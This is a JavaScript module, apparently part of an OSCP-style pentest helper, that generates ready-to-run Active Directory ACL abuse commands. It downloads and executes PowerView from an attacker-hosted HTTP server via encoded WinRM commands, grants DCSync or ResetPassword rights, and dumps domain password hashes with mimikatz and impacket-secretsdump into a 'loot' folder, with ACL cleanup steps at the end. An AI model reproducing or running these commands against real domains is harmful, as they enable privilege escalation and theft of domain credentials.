const canonicalRight = (value) => {
  const rights = new Map([
    ["all", "All"],
    ["resetpassword", "ResetPassword"],
    ["writemembers", "WriteMembers"],
    ["dcsync", "DCSync"],
  ]);
  return rights.get(String(value || "").trim().toLowerCase()) || "";
};

const shellQuote = (value) => `'${String(value).replaceAll("'", `'"'"'`)}'`;
const variableValue = (variables, key) => String(variables[key] || `{{${key}}}`).trim();

const principalSid = "$PrincipalSid = Get-DomainObject -Identity '{{aclPrincipal}}' -Domain '{{domain}}' -Properties objectSid | Select-Object -ExpandProperty objectSid";
const aclQuery = "Get-DomainObjectAcl -Identity '{{aclTarget}}' -Domain '{{domain}}' -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq $PrincipalSid }";
const baselinePath = "$BaselinePath = Join-Path $env:TEMP 'oscp-acl-before.xml'";
const compareAcl = `$BeforeKeys = @('__ACL_BASELINE__') + @($Before | ForEach-Object { "$($_.ActiveDirectoryRights)|$($_.ObjectAceType)|$($_.AceQualifier)|$($_.IsInherited)" }); $CurrentKeys = @('__ACL_BASELINE__') + @($Current | ForEach-Object { "$($_.ActiveDirectoryRights)|$($_.ObjectAceType)|$($_.AceQualifier)|$($_.IsInherited)" }); $Diff = Compare-Object -ReferenceObject $BeforeKeys -DifferenceObject $CurrentKeys`;

const winrmIdentity = (variables) => `-d ${shellQuote(variableValue(variables, "domain"))} -u ${shellQuote(variableValue(variables, "user"))}`;
const winrmAuth = (variables) => String(variables.password || "").trim()
  ? `-p ${shellQuote(variables.password)}`
  : `-H ${shellQuote(variableValue(variables, "hash"))}`;

const powerViewHost = "pv='{{powerViewPath}}'; test -f \"$pv\" || { echo 'PowerView.ps1 was not found; update POWER VIEW PATH'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/notes'; if ! curl -fsS --max-time 2 'http://{{lhost}}:{{powerViewPort}}/PowerView.ps1' >/dev/null 2>&1; then (cd \"$(dirname \"$pv\")\" && nohup python3 -m http.server {{powerViewPort}} --bind {{lhost}} >'{{workspaceRoot}}/{{targetName}}/notes/powerview-http.log' 2>&1 &); sleep 1; fi";

const remotePowerView = (script, variables) => {
  const loader = "$ProgressPreference = 'SilentlyContinue'; IEX((New-Object Net.WebClient).DownloadString('http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'))";
  const payload = shellQuote(`${loader}; ${script}`);
  return `${powerViewHost}; payload=$(printf '%s' ${payload} | iconv -f UTF-8 -t UTF-16LE | base64 -w0); nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)} -X \"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand $payload\"`;
};

export function buildAclCommands(variables = {}) {
  const right = canonicalRight(variables.aclRights);
  if (!right) {
    return [{
      key: "acl-invalid-right",
      label: "Choose a supported PowerView ACL right",
      value: "printf '%s\\n' 'ACL rights must be one of: All, ResetPassword, WriteMembers, DCSync' >&2; false",
    }];
  }
  const target = String(variables.aclTarget || "selected target").trim();
  const principal = String(variables.aclPrincipal || "selected principal").trim();
  const identity = `${right}: ${principal} -> ${target}`;
  const commands = [
    {
      key: "acl-winrm-check",
      label: `WinRM: test ${principal}'s remote access`,
      value: `nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)}`,
    },
    {
      key: "acl-evil-winrm",
      label: "Evil-WinRM: open an interactive PowerView fallback",
      value: `evil-winrm -i {{rhost}} -u ${shellQuote(`${variableValue(variables, "domain")}\\${variableValue(variables, "user")}`)} ${winrmAuth(variables)} -s \"$(dirname '{{powerViewPath}}')\"`,
    },
    {
      key: "acl-powerview-check",
      label: "PowerView over WinRM: confirm required functions",
      value: remotePowerView("Get-Command Get-DomainObject,Get-DomainObjectAcl,Add-DomainObjectAcl,Remove-DomainObjectAcl | Select-Object Name,CommandType", variables),
    },
    {
      key: "acl-capture-before",
      label: `Capture current ACL — ${identity}`,
      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(${aclQuery}); Export-Clixml -InputObject $Before -Path $BaselinePath; $Before | Format-List SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceQualifier,IsInherited`, variables),
    },
    {
      key: "acl-grant",
      label: `Grant ${right} — ${principal} on ${target}`,
      value: remotePowerView(`Add-DomainObjectAcl -TargetIdentity '{{aclTarget}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}' -Verbose`, variables),
    },
    {
      key: "acl-verify-grant",
      label: `Review granted ACL change — ${identity}`,
      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; $Current | Format-Table SecurityIdentifier,ObjectAceType,ActiveDirectoryRights,AceQualifier -AutoSize; $Diff | Format-Table -AutoSize; if (-not $Diff) { throw 'No ACL change was detected' }`, variables),
    },
  ];

  if (right === "DCSync") {
    commands.push({
      key: "acl-dcsync-mimikatz",
      label: `Mimikatz console: DCSync as ${principal}`,
      value: "lsadump::dcsync /domain:{{domain}} /user:{{dcsyncUser}}",
    });

    const samePrincipal = !variables.aclPrincipal || !variables.user
      || String(variables.aclPrincipal).trim().toLowerCase() === String(variables.user).trim().toLowerCase();
    if (samePrincipal) {
      commands.push(
        {
          key: "acl-dcsync-impacket-password",
          label: `Impacket DCSync with ${principal}'s password`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
        {
          key: "acl-dcsync-impacket-hash",
          label: `Impacket DCSync with ${principal}'s NT hash`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
      );
    }
  }

  commands.push(
    {
      key: "acl-cleanup",
      label: `Cleanup ${right} — ${principal} on ${target}`,
      value: remotePowerView(`Remove-DomainObjectAcl -TargetIdentity '{{aclTarget}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}' -Verbose`, variables),
    },
    {
      key: "acl-verify-cleanup",
      label: `Verify ACL restoration — ${identity}`,
      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; if ($Diff) { $Diff | Format-Table -AutoSize; throw 'ACL cleanup does not match the captured baseline' } else { Remove-Item -Path $BaselinePath -Force; 'ACL cleanup matches the captured baseline' }`, variables),
    },
  );

  return commands;
}
